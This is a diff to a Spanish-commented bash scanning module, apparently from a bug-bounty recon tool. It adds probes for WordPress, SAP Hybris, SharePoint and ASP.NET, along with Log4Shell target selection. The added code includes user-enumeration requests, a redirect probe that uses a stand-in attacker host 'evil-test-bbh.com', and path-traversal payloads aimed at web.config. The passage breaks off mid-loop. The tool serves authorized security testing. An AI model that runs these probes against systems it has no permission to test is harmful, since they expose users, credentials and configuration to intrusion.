@@ -119,6 +119,136 @@ _get_urls_with_tech() {
 #  SCANNERS POR TECNOLOGÍA
 # ──────────────────────────────────────────────────────────────
 
+# ── WordPress REST API passive scan (sin API token) ───────────
+#
+# Extrae plugins instalados desde los namespaces de /wp-json/,
+# comprueba endpoints sensibles sin auth, y detecta el vector
+# de phishing via Application Passwords.
+_wp_rest_passive_scan() {
+  local DOMAIN_ID="$1" DOMAIN="$2" URL="$3" CURL_PROXY="$4"
+
+  local WP_JSON_URL="${URL%/}/wp-json/"
+  local RESP STATUS BODY
+
+  RESP=$(curl -si --max-time 10 \
+    -H "User-Agent: Mozilla/5.0" \
+    -H "Accept: application/json" \
+    ${CURL_PROXY} "${WP_JSON_URL}" 2>/dev/null)
+  STATUS=$(echo "$RESP" | head -1 | grep -o '[0-9][0-9][0-9]')
+  BODY=$(echo "$RESP" | sed -n '/^\r\{0,1\}$/,$ p' | tail -n +2)
+
+  [[ "$STATUS" != "200" ]] && return
+
+  # 1. Extraer namespaces y mapear a plugins conocidos
+  local NAMESPACES
+  NAMESPACES=$(echo "$BODY" | python3 -c "
+import sys, json
+try:
+    d = json.load(sys.stdin)
+    for ns in d.get('namespaces', []):
+        print(ns)
+except: pass
+" 2>/dev/null)
+  [[ -z "$NAMESPACES" ]] && return
+
+  declare -A _NS_MAP
+  _NS_MAP=(
+    ["yoast/v1"]="Yoast SEO"
+    ["contact-form-7/v1"]="Contact Form 7"
+    ["newsletter_api/v1"]="Newsletter"
+    ["jetpack/v4"]="Jetpack"
+    ["jetpack-boost/v1"]="Jetpack Boost"
+    ["cron-control/v1"]="VIP Cron Control"
+    ["two-factor/1.0"]="Two-Factor Auth"
+    ["akismet/v1"]="Akismet"
+    ["wpcom/v2"]="WordPress.com API"
+    ["vip/v1"]="WordPress VIP"
+    ["woocommerce/v1"]="WooCommerce"
+    ["woocommerce/v2"]="WooCommerce"
+    ["woocommerce/v3"]="WooCommerce"
+    ["buddypress/v1"]="BuddyPress"
+    ["learndash/v1"]="LearnDash LMS"
+    ["elementor/v1"]="Elementor"
+    ["gravityforms/v2"]="Gravity Forms"
+    ["ninja-forms/v1"]="Ninja Forms"
+    ["rankmath/v1"]="Rank Math SEO"
+    ["mepr/v1"]="MemberPress"
+    ["tribe/events/v1"]="The Events Calendar"
+    ["wc/v3"]="WooCommerce"
+    ["give-api/v2"]="GiveWP Donations"
+    ["lifterlms/v1"]="LifterLMS"
+  )
+
+  local DETECTED=""
+  while IFS= read -r NS; do
+    [[ -z "$NS" ]] && continue
+    local PNAME="${_NS_MAP[$NS]:-}"
+    [[ -n "$PNAME" ]] && DETECTED+="${PNAME} [${NS}], "
+  done <<< "$NAMESPACES"
+
+  if [[ -n "$DETECTED" ]]; then
+    DETECTED="${DETECTED%, }"
+    log_info "  wp-json namespaces → $DETECTED"
+    _cms_finding "$DOMAIN_ID" "$DOMAIN" "${WP_JSON_URL}" \
+      "WordPress REST API Plugin Fingerprint" "info" \
+      "Plugins via namespaces (sin API token): ${DETECTED}" "wp_rest_api"
+  fi
+
+  # 2. User enumeration via /wp/v2/users
+  local USERS_URL="${URL%/}/wp-json/wp/v2/users"
+  local U_STATUS U_BODY
+  U_BODY=$(curl -s --max-time 8 -H "User-Agent: Mozilla/5.0" \
+    ${CURL_PROXY} -o /tmp/.wp_users_$$ -w "%{http_code}" "$USERS_URL" 2>/dev/null)
+  U_STATUS="$U_BODY"
+  U_BODY=$(cat /tmp/.wp_users_$$ 2>/dev/null); rm -f /tmp/.wp_users_$$
+
+  if [[ "$U_STATUS" == "200" ]]; then
+    local USER_LIST
+    USER_LIST=$(echo "$U_BODY" | python3 -c "
+import sys, json
+try:
+    users = json.load(sys.stdin)
+    if isinstance(users, list) and users:
+        for u in users:
+            print(f'id={u.get(\"id\",\"?\")} slug={u.get(\"slug\",\"?\")} name={u.get(\"name\",\"?\")}')
+except: pass
+" 2>/dev/null)
+    if [[ -n "$USER_LIST" ]]; then
+      _cms_finding "$DOMAIN_ID" "$DOMAIN" "$USERS_URL" \
+        "WordPress User Enumeration" "medium" \
+        "wp/v2/users accesible sin auth: ${USER_LIST//$'\n'/ | }" "wp_rest_api"
+    fi
+  fi
+
+  # 3. Newsletter subscribers expuestos (plugin Newsletter)
+  if echo "$NAMESPACES" | grep -q "newsletter_api"; then
+    local NL_URL="${URL%/}/wp-json/newsletter_api/v1/users"
+    local NL_STATUS
+    NL_STATUS=$(curl -o /dev/null -s --max-time 8 -w "%{http_code}" \
+      -H "User-Agent: Mozilla/5.0" ${CURL_PROXY} "$NL_URL" 2>/dev/null)
+    if [[ "$NL_STATUS" == "200" ]]; then
+      _cms_finding "$DOMAIN_ID" "$DOMAIN" "$NL_URL" \
+        "WordPress Newsletter Subscribers Exposed" "high" \
+        "newsletter_api/v1/users accesible sin auth — suscriptores expuestos (GDPR)" "wp_rest_api"
+    fi
+  fi
+
+  # 4. Application Password phishing — success_url sin validación de origen
+  local AP_URL="${URL%/}/wp-admin/authorize-application.php"
+  local AP_LOC
+  AP_LOC=$(curl -si --max-time 8 -H "User-Agent: Mozilla/5.0" \
+    -G --data-urlencode "app_name=Test" \
+        --data-urlencode "success_url=https://evil-test-bbh.com" \
+    ${CURL_PROXY} "$AP_URL" 2>/dev/null | grep -i "^location:" | tr -d '\r')
+
+  # Vulnerable si preserva success_url externo en el redirect al login
+  if echo "$AP_LOC" | grep -qi "evil-test-bbh\.com\|success_url"; then
+    _cms_finding "$DOMAIN_ID" "$DOMAIN" "$AP_URL" \
+      "WordPress Application Password Phishing" "high" \
+      "authorize-application.php preserva success_url externo sin validar — admin que aprueba envía su Application Password al atacante" "wp_rest_api"
+  fi
+}
+
 # ── WordPress ─────────────────────────────────────────────────
 _scan_wordpress() {
   local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"
@@ -126,6 +256,17 @@ _scan_wordpress() {
   local SUBS
   SUBS=$(_get_subs_with_tech "$DOMAIN_ID" "%WordPress%")
   [[ -z "$SUBS" ]] && return
+
+  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
+  proxy_check 2>/dev/null || true
+  local CURL_PROXY=""
+  ${PROXY_ACTIVE:-false} && CURL_PROXY="--proxy ${PROXY_URL}"
+
+  # REST API passive scan — no requiere wpscan ni API token
+  while IFS= read -r SUB; do
+    [[ -z "$SUB" ]] && continue
+    _wp_rest_passive_scan "$DOMAIN_ID" "$DOMAIN" "https://${SUB}" "$CURL_PROXY"
+  done <<< "$SUBS"
 
   _ensure_wpscan || { log_warn "wpscan no disponible para WordPress"; return; }
 
@@ -142,7 +283,7 @@ _scan_wordpress() {
 
     # Usar Docker si está disponible, sino wpscan directo
     if docker image inspect wpscanteam/wpscan:latest &>/dev/null 2>&1; then
-      docker run --rm wpscanteam/wpscan \
+      timeout 300 docker run --rm wpscanteam/wpscan \
         --url "$URL" \
         --format json \
         --no-banner \
@@ -150,7 +291,7 @@ _scan_wordpress() {
         $TOKEN_FLAG \
         2>/dev/null > "$WP_OUT" || true
     else
-      wpscan \
+      timeout 300 wpscan \
         --url "$URL" \
         --format json \
         --no-banner \
@@ -162,8 +303,8 @@ _scan_wordpress() {
     if [[ -s "$WP_OUT" ]] && command -v jq &>/dev/null; then
       # Vulnerabilidades en plugins
       local VULNS
-      VULNS=$(jq -r '.plugins[]? | 
-        .vulnerabilities[]? | 
+      VULNS=$(jq -r '.plugins[]? |
+        .vulnerabilities[]? |
         "\(.title) — \(.references.url[0] // "")"' \
         "$WP_OUT" 2>/dev/null | head -10)
 
@@ -210,7 +351,7 @@ _scan_joomla() {
     log_info "  joomscan → $URL"
     local JS_OUT="$OUT_DIR/.joomscan_${SUB//[^a-zA-Z0-9]/_}.txt"
 
-    perl "$HOME/tools/joomscan/joomscan.pl" \
+    timeout 120 perl "$HOME/tools/joomscan/joomscan.pl" \
       -u "$URL" --ec 2>/dev/null > "$JS_OUT" || true
 
     if [[ -s "$JS_OUT" ]]; then
@@ -244,7 +385,7 @@ _scan_drupal() {
     log_info "  droopescan → $URL"
     local DS_OUT="$OUT_DIR/.droopescan_${SUB//[^a-zA-Z0-9]/_}.txt"
 
-    droopescan scan drupal -u "$URL" 2>/dev/null > "$DS_OUT" || true
+    timeout 120 droopescan scan drupal -u "$URL" 2>/dev/null > "$DS_OUT" || true
 
     if [[ -s "$DS_OUT" ]]; then
       local VERSION
@@ -313,10 +454,10 @@ _scan_aem() {
     local IS_AEM=false
 
     # Detectar AEM por paths característicos
-    for PATH in "/libs/granite/core/content/login.html" "/crx/de/index.jsp"; do
+    for AEM_PATH in "/libs/granite/core/content/login.html" "/crx/de/index.jsp"; do
       local STATUS
       STATUS=$(curl -sL --max-time 8 ${CURL_PROXY} \
-        -o /dev/null -w "%{http_code}" "${BASE}${PATH}" 2>/dev/null)
+        -o /dev/null -w "%{http_code}" "${BASE}${AEM_PATH}" 2>/dev/null)
       if [[ "$STATUS" == "200" || "$STATUS" == "302" ]]; then
         IS_AEM=true
         log_warn "  ⚡ AEM detectado: $BASE"
@@ -605,33 +746,51 @@ _scan_log4shell() {
   # ── Detectar subdominios con tecnología Java ───────────────
   # 1. Desde la DB de tech fingerprinting (módulo 10)
   local JAVA_SUBS_DB
-  JAVA_SUBS_DB=$(sqlite3 "$DB_PATH"     "SELECT DISTINCT subdomain FROM technologies
+  JAVA_SUBS_DB=$(sqlite3 "$DB_PATH" \
+    "SELECT DISTINCT subdomain FROM technologies
      WHERE domain_id=${DOMAIN_ID}
        AND (tech_name LIKE '%Java%' OR tech_name LIKE '%Tomcat%'
             OR tech_name LIKE '%Spring%' OR tech_name LIKE '%Log4j%'
             OR tech_name LIKE '%Struts%' OR tech_name LIKE '%JBoss%'
             OR tech_name LIKE '%WebLogic%' OR tech_name LIKE '%Jetty%'
             OR tech_name LIKE '%GlassFish%' OR tech_name LIKE '%WildFly%'
-            OR tech_name LIKE '%Elasticsearch%');" 2>/dev/null)
+            OR tech_name LIKE '%Elasticsearch%' OR tech_name LIKE '%Liferay%'
+            OR tech_name LIKE '%OpenCms%' OR tech_name LIKE '%Hippo%'
+            OR tech_name LIKE '%Bloomreach%' OR tech_name LIKE '%Hybris%'
+            OR tech_name LIKE '%Jenkins%' OR tech_name LIKE '%Confluence%'
+            OR tech_name LIKE '%JIRA%' OR tech_name LIKE '%Bitbucket%');" 2>/dev/null)
 
-  # 2. URLs con extensiones Java (.do, .action, .jsp, .jsf)
+  # 2. URLs con extensiones o rutas Java — trailing % para capturar query strings
   local JAVA_SUBS_URLS
-  JAVA_SUBS_URLS=$(sqlite3 "$DB_PATH"     "SELECT DISTINCT subdomain FROM subdomains s
+  JAVA_SUBS_URLS=$(sqlite3 "$DB_PATH" \
+    "SELECT DISTINCT subdomain FROM subdomains s
      WHERE s.domain_id=${DOMAIN_ID} AND s.status='alive'
        AND EXISTS (
          SELECT 1 FROM urls u
          WHERE u.domain_id=s.domain_id
-           AND u.url LIKE '%' || s.subdomain || '%'
-           AND (u.url LIKE '%.do' OR u.url LIKE '%.action'
-                OR u.url LIKE '%.jsp' OR u.url LIKE '%.jsf'
-                OR u.url LIKE '%struts%' OR u.url LIKE '%spring%')
+           AND (u.url LIKE '%.jsp%' OR u.url LIKE '%.do%'
+                OR u.url LIKE '%.action%' OR u.url LIKE '%.jsf%'
+                OR u.url LIKE '%/system/modules/%'
+                OR u.url LIKE '%/opencms/%' OR u.url LIKE '%/cms/workspace%'
+                OR u.url LIKE '%struts%' OR u.url LIKE '%spring%'
+                OR u.url LIKE '%actuator%' OR u.url LIKE '%/jolokia/%')
        );" 2>/dev/null)
 
-  # Combinar y deduplicar — sin live detection para no molestar
-  # Si el módulo 10 no detectó Java, no lanzamos Log4Shell
+  # 3. Fallback: todos los subdominios alive si no hay tech/URL signal
+  #    pero SÍ hay headers Java conocidos en HTTP responses
+  local JAVA_SUBS_HEADERS
+  JAVA_SUBS_HEADERS=$(sqlite3 "$DB_PATH" \
+    "SELECT DISTINCT subdomain FROM subdomains
+     WHERE domain_id=${DOMAIN_ID} AND status='alive'
+       AND (http_title LIKE '%Tomcat%' OR http_title LIKE '%GlassFish%'
+            OR http_title LIKE '%JBoss%' OR http_title LIKE '%WildFly%'
+            OR http_title LIKE '%Jenkins%' OR http_title LIKE '%Spring%');" 2>/dev/null)
+
+  # Combinar y deduplicar
   local ALL_JAVA_SUBS
-  ALL_JAVA_SUBS=$(printf '%s
-%s'     "$JAVA_SUBS_DB" "$JAVA_SUBS_URLS" |     grep -v '^$' | sort -u)
+  ALL_JAVA_SUBS=$(printf '%s\n%s\n%s' \
+    "$JAVA_SUBS_DB" "$JAVA_SUBS_URLS" "$JAVA_SUBS_HEADERS" \
+    | grep -v '^$' | sort -u)
 
   if [[ -z "$ALL_JAVA_SUBS" ]]; then
     log_info "  Log4Shell: sin tecnología Java detectada — saltando"
@@ -666,7 +825,7 @@ _scan_log4shell() {
   # ── log4j-scan herramienta dedicada ───────────────────────
   if _ensure_log4j_scan 2>/dev/null &&      [[ -f "$HOME/tools/log4j-scan/log4j-scan.py" ]] &&      [[ -s "$JAVA_TARGETS" ]]; then
     log_info "  log4j-scan sobre $JAVA_COUNT targets Java..."
-    timeout 300 python3 "$HOME/tools/log4j-scan/log4j-scan.py"       -l "$JAVA_TARGETS"       --run-all-tests       2>/dev/null | grep -i "vulnerable\|CVE" |       while IFS= read -r LINE; do
+    timeout 300 python3 "$HOME/tools/log4j-scan/log4j-scan.py"       -l "$JAVA_TARGETS"       --run-all-tests       2>/dev/null | grep -i "vulnerable" |       while IFS= read -r LINE; do
         log_warn "  ⚡⚡ log4j-scan: $LINE"
         _cms_finding "$DOMAIN_ID" "$DOMAIN" "$DOMAIN"           "Log4Shell log4j-scan" "critical" "$LINE" "log4j-scan"
       done
@@ -848,6 +1007,636 @@ _scan_react2shell() {
   rm -f "$TARGETS" "$R2S_OUT"
 }
 
+# ── SAP Hybris Commerce Cloud ─────────────────────────────────
+_scan_hybris() {
+  local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"
+
+  # Detección: tech DB + URLs con paths característicos de Hybris
+  local SUBS
+  SUBS=$(sqlite3 "$DB_PATH" \
+    "SELECT DISTINCT subdomain FROM technologies
+     WHERE domain_id=${DOMAIN_ID}
+       AND (tech_name LIKE '%Hybris%' OR tech_name LIKE '%SAP Commerce%'
+            OR tech_name LIKE '%storefront%')
+     UNION
+     SELECT DISTINCT s.subdomain FROM subdomains s
+     WHERE s.domain_id=${DOMAIN_ID} AND s.status='alive'
+       AND EXISTS (
+         SELECT 1 FROM urls u WHERE u.domain_id=s.domain_id
+           AND (u.url LIKE '%storefront%' OR u.url LIKE '%/hac/%'
+                OR u.url LIKE '%/backoffice/%' OR u.url LIKE '%srcatc%'
+                OR u.url LIKE '%samlsso%')
+       );" 2>/dev/null)
+
+  # Detección adicional: probar /hac/ en todos los subdominios alive si no hay hits en DB
+  if [[ -z "$SUBS" ]]; then
+    local ALIVE_SUBS
+    ALIVE_SUBS=$(sqlite3 "$DB_PATH" \
+      "SELECT subdomain FROM subdomains WHERE domain_id=${DOMAIN_ID} AND status='alive';" \
+      2>/dev/null)
+    while IFS= read -r SUB; do
+      [[ -z "$SUB" ]] && continue
+      local HAC_STATUS
+      HAC_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 6 \
+        -o /dev/null -w "%{http_code}" "https://${SUB}/hac/" 2>/dev/null)
+      # 403 o 302 en /hac/ ya indica que Hybris está detrás
+      if [[ "$HAC_STATUS" == "200" || "$HAC_STATUS" == "302" || "$HAC_STATUS" == "401" ]]; then
+        SUBS="${SUBS}${SUB}"$'\n'
+        log_info "  Hybris detectado por /hac/ en $SUB (HTTP $HAC_STATUS)"
+      fi
+    done <<< "$ALIVE_SUBS"
+  fi
+
+  [[ -z "$SUBS" ]] && return
+
+  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
+  proxy_check
+  local CURL_PROXY=""
+  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"
+
+  while IFS= read -r SUB; do
+    [[ -z "$SUB" ]] && continue
+    local BASE="https://${SUB}"
+    log_info "  SAP Hybris scan → $BASE"
+
+    # HAC (Hybris Admin Console) — si está abierto es critical
+    for HAC_PATH in "/hac/" "/hac/console" "/hac/monitoring/cache" "/hac/platform"; do
+      local STATUS BODY
+      STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
+        -o /tmp/.hybris_$$ -w "%{http_code}" -L "${BASE}${HAC_PATH}" 2>/dev/null)
+      if [[ "$STATUS" == "200" ]]; then
+        BODY=$(head -c 200 /tmp/.hybris_$$ 2>/dev/null)
+        if echo "$BODY" | grep -qi "hac\|hybris\|SAP\|Platform\|console"; then
+          _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${HAC_PATH}" \
+            "SAP Hybris HAC Exposed" "critical" \
+            "Hybris Admin Console accesible sin autenticación: ${HAC_PATH}" "hybris_hac"
+        fi
+      fi
+    done
+
+    # Backoffice (gestión de catálogo/pedidos)
+    local BO_STATUS
+    BO_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
+      -o /dev/null -w "%{http_code}" -L "${BASE}/backoffice/" 2>/dev/null)
+    if [[ "$BO_STATUS" == "200" ]]; then
+      _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/backoffice/" \
+        "SAP Hybris Backoffice Exposed" "critical" \
+        "Backoffice de administración accesible" "hybris_backoffice"
+    fi
+
+    # SAML metadata — puede revelar entityID, certificados y URLs internas
+    for SAML_PATH in "/saml/metadata" "/samlsso/metadata" "/srcatcsamlsso/saml/metadata" \
+                     "/${SUB%%.*}samlsso/saml/metadata"; do
+      local SAML_STATUS SAML_BODY
+      SAML_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
+        -o /tmp/.saml_$$ -w "%{http_code}" "${BASE}${SAML_PATH}" 2>/dev/null)
+      if [[ "$SAML_STATUS" == "200" ]]; then
+        SAML_BODY=$(head -c 300 /tmp/.saml_$$ 2>/dev/null)
+        if echo "$SAML_BODY" | grep -qi "EntityDescriptor\|md:EntityID\|saml"; then
+          _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${SAML_PATH}" \
+            "SAML Metadata Exposed" "medium" \
+            "Metadata SAML accesible — expone entityID, URLs internas y certificados: ${SAML_PATH}" "hybris_saml"
+        fi
+      fi
+    done
+
+    rm -f /tmp/.hybris_$$ /tmp/.saml_$$
+
+    # Nuclei templates SAP Commerce
+    if command -v nuclei &>/dev/null; then
+      nuclei -u "$BASE" -tags "sap,hybris,commerce" -silent -jsonl 2>/dev/null | \
+        while IFS= read -r LINE; do
+          local TEMPLATE SEV
+          TEMPLATE=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
+          SEV=$(echo "$LINE"      | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','?'))" 2>/dev/null)
+          _cms_finding "$DOMAIN_ID" "$DOMAIN" "$BASE" \
+            "SAP Hybris Nuclei" "$SEV" "Template: $TEMPLATE" "nuclei:$TEMPLATE"
+        done
+    fi
+  done <<< "$SUBS"
+}
+
+# ── SharePoint ────────────────────────────────────────────────
+_scan_sharepoint() {
+  local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"
+
+  # Detección: tech DB + URLs con paths característicos de SharePoint
+  local SUBS
+  SUBS=$(sqlite3 "$DB_PATH" \
+    "SELECT DISTINCT subdomain FROM technologies
+     WHERE domain_id=${DOMAIN_ID}
+       AND (tech_name LIKE '%SharePoint%' OR tech_name LIKE '%Microsoft%')
+     UNION
+     SELECT DISTINCT s.subdomain FROM subdomains s
+     WHERE s.domain_id=${DOMAIN_ID} AND s.status='alive'
+       AND EXISTS (
+         SELECT 1 FROM urls u WHERE u.domain_id=s.domain_id
+           AND (u.url LIKE '%/_layouts/15/%' OR u.url LIKE '%/Style Library/%'
+                OR u.url LIKE '%/_vti_bin/%' OR u.url LIKE '%/_api/%'
+                OR u.url LIKE '%/sites/%' OR u.url LIKE '%.aspx%')
+       );" 2>/dev/null)
+
+  [[ -z "$SUBS" ]] && return
+
+  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
+  proxy_check
+  local CURL_PROXY=""
+  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"
+
+  while IFS= read -r SUB; do
+    [[ -z "$SUB" ]] && continue
+    local BASE="https://${SUB}"
+    log_info "  SharePoint scan → $BASE"
+
+    # Necesitamos determinar el site path base (puede ser /ca/, /es/, /sites/X/, etc.)
+    local SITE_BASES=("" "/ca" "/es" "/en" "/sites/default")
+    # Intentar descubrir base desde URLs en DB
+    local DB_BASE
+    DB_BASE=$(sqlite3 "$DB_PATH" \
+      "SELECT url FROM urls WHERE domain_id=${DOMAIN_ID} AND url LIKE '%/_api/%' LIMIT 1;" \
+      2>/dev/null | grep -oP 'https?://[^/]+(/[^/_][^/]*)?' || echo "")
+    [[ -n "$DB_BASE" ]] && SITE_BASES=("${DB_BASE#https://$SUB}" "${SITE_BASES[@]}")
+
+    for SITE_BASE in "${SITE_BASES[@]}"; do
+      # REST API — si responde JSON sin auth hay info disclosure
+      local API_STATUS API_BODY
+      API_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
+        -H "Accept: application/json;odata=verbose" \
+        -o /tmp/.sp_api_$$ -w "%{http_code}" \
+        "${BASE}${SITE_BASE}/_api/web" 2>/dev/null)
+
+      if [[ "$API_STATUS" == "200" ]]; then
+        API_BODY=$(head -c 200 /tmp/.sp_api_$$ 2>/dev/null)
+        if echo "$API_BODY" | grep -qi '"Title"\|odata.metadata\|SP.Web'; then
+          local SP_TITLE
+          SP_TITLE=$(echo "$API_BODY" | grep -oP '"Title":"[^"]+"' | head -1)
+          _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${SITE_BASE}/_api/web" \
+            "SharePoint REST API Exposed" "medium" \
+            "SharePoint REST API accesible sin autenticación — ${SP_TITLE:-info disclosure}" "sharepoint_api"
+
+          # Si /_api/web responde, probar listas y búsqueda
+          local LISTS_STATUS
+          LISTS_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
+            -H "Accept: application/json;odata=verbose" \
+            -o /tmp/.sp_lists_$$ -w "%{http_code}" \
+            "${BASE}${SITE_BASE}/_api/web/lists" 2>/dev/null)
+          if [[ "$LISTS_STATUS" == "200" ]]; then
+            local LIST_COUNT
+            LIST_COUNT=$(python3 -c "import json,sys; d=json.load(sys.stdin); print(len(d.get('d',{}).get('results',[])))" \
+              /tmp/.sp_lists_$$ 2>/dev/null || echo "?")
+            _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${SITE_BASE}/_api/web/lists" \
+              "SharePoint Lists Enumerable" "high" \
+              "SharePoint listas accesibles sin auth — $LIST_COUNT listas expuestas" "sharepoint_lists"
+          fi
+          break
+        fi
+      fi
+    done
+
+    # _vti_inf.html — confirma SharePoint y revela versión
+    local VTI_STATUS VTI_BODY
+    VTI_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
+      -o /tmp/.vti_$$ -w "%{http_code}" "${BASE}/_vti_inf.html" 2>/dev/null)
+    if [[ "$VTI_STATUS" == "200" ]]; then
+      VTI_BODY=$(cat /tmp/.vti_$$ 2>/dev/null)
+      if echo "$VTI_BODY" | grep -qi "FrontPage\|SharePoint\|vti_"; then
+        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/_vti_inf.html" \
+          "SharePoint Version Disclosure" "low" \
+          "Archivo _vti_inf.html accesible — revela versión SharePoint: $(echo "$VTI_BODY" | grep -oP 'FrontPage \S+' | head -1)" "sharepoint_vti"
+      fi
+    fi
+
+    # trace.axd — ASP.NET tracing (aplicable a SharePoint on-premise)
+    local TRACE_STATUS
+    TRACE_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
+      -o /tmp/.trace_$$ -w "%{http_code}" "${BASE}/trace.axd" 2>/dev/null)
+    if [[ "$TRACE_STATUS" == "200" ]]; then
+      if grep -qi "Application Trace\|Request Details" /tmp/.trace_$$ 2>/dev/null; then
+        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/trace.axd" \
+          "ASP.NET Trace Enabled" "high" \
+          "trace.axd accesible — expone requests, sesiones y variables de entorno" "aspnet_trace"
+      fi
+    fi
+
+    rm -f /tmp/.sp_api_$$ /tmp/.sp_lists_$$ /tmp/.vti_$$ /tmp/.trace_$$
+
+    # Nuclei SharePoint
+    if command -v nuclei &>/dev/null; then
+      nuclei -u "$BASE" -tags "sharepoint,microsoft" -silent -jsonl 2>/dev/null | \
+        while IFS= read -r LINE; do
+          local TEMPLATE SEV
+          TEMPLATE=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
+          SEV=$(echo "$LINE"      | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','?'))" 2>/dev/null)
+          _cms_finding "$DOMAIN_ID" "$DOMAIN" "$BASE" \
+            "SharePoint Nuclei" "$SEV" "Template: $TEMPLATE" "nuclei:$TEMPLATE"
+        done
+    fi
+  done <<< "$SUBS"
+}
+
+# ── ASP.NET handlers y WebForms ───────────────────────────────
+_scan_aspnet() {
+  local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"
+
+  # Detección: tech DB + URLs con .aspx/.ashx en DB
+  local SUBS
+  SUBS=$(sqlite3 "$DB_PATH" \
+    "SELECT DISTINCT subdomain FROM technologies
+     WHERE domain_id=${DOMAIN_ID}
+       AND (tech_name LIKE '%ASP.NET%' OR tech_name LIKE '%IIS%'
+            OR tech_name LIKE '%Microsoft%')
+     UNION
+     SELECT DISTINCT s.subdomain FROM subdomains s
+     WHERE s.domain_id=${DOMAIN_ID} AND s.status='alive'
+       AND EXISTS (
+         SELECT 1 FROM urls u WHERE u.domain_id=s.domain_id
+           AND (u.url LIKE '%.aspx%' OR u.url LIKE '%.ashx%'
+                OR u.url LIKE '%.asmx%')
+       );" 2>/dev/null)
+
+  [[ -z "$SUBS" ]] && return
+
+  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
+  proxy_check
+  local CURL_PROXY=""
+  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"
+
+  while IFS= read -r SUB; do
+    [[ -z "$SUB" ]] && continue
+    local BASE="https://${SUB}"
+    log_info "  ASP.NET scan → $BASE"
+
+    # trace.axd — ASP.NET application tracing
+    local TRACE_STATUS
+    TRACE_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
+      -o /tmp/.trace_$$ -w "%{http_code}" "${BASE}/trace.axd" 2>/dev/null)
+    if [[ "$TRACE_STATUS" == "200" ]]; then
+      grep -qi "Application Trace\|Request Details" /tmp/.trace_$$ 2>/dev/null && \
+        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/trace.axd" \
+          "ASP.NET Trace Enabled" "high" \
+          "trace.axd accesible — expone requests, sesiones y variables de entorno" "aspnet_trace"
+    fi
+
+    # elmah.axd — Error log handler (muy común en apps legacy)
+    local ELMAH_STATUS
+    ELMAH_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
+      -o /tmp/.elmah_$$ -w "%{http_code}" "${BASE}/elmah.axd" 2>/dev/null)
+    if [[ "$ELMAH_STATUS" == "200" ]]; then
+      grep -qi "Error Log\|ELMAH\|exception" /tmp/.elmah_$$ 2>/dev/null && \
+        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/elmah.axd" \
+          "ASP.NET ELMAH Error Log Exposed" "high" \
+          "elmah.axd accesible — expone stack traces, rutas internas y posibles credenciales" "aspnet_elmah"
+    fi
+
+    # .ashx handlers con parámetros de fichero — path traversal
+    local ASHX_HANDLERS
+    ASHX_HANDLERS=$(sqlite3 "$DB_PATH" \
+      "SELECT DISTINCT url FROM urls
+       WHERE domain_id=${DOMAIN_ID}
+         AND (url LIKE '%.ashx?%' OR url LIKE '%.ashx&%')
+         AND (url LIKE '%file=%' OR url LIKE '%path=%' OR url LIKE '%model=%'
+              OR url LIKE '%doc=%' OR url LIKE '%template=%' OR url LIKE '%name=%'
+              OR url LIKE '%download=%' OR url LIKE '%filename=%')
+       LIMIT 20;" 2>/dev/null)
+
+    while IFS= read -r ASHX_URL; do
+      [[ -z "$ASHX_URL" ]] && continue
+      # Extraer base del handler y nombre del parámetro de fichero
+      local HANDLER_BASE PARAM_NAME
+      HANDLER_BASE=$(echo "$ASHX_URL" | grep -oP 'https?://[^?]+')
+      PARAM_NAME=$(echo "$ASHX_URL" | grep -oP '(?<=\?|&)(file|path|model|doc|template|name|download|filename)(?==)' | head -1)
+      [[ -z "$PARAM_NAME" ]] && continue
+
+      # Probar path traversal con diferentes profundidades
+      for PAYLOAD in "../web.config" "../../web.config" "../../../web.config" \
+                     "..%2Fweb.config" "%2e%2e%2fweb.config"; do
+        local TRAV_STATUS TRAV_BODY
+        TRAV_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 ${CURL_PROXY} \
+          -o /tmp/.ashx_$$ -w "%{http_code}" \
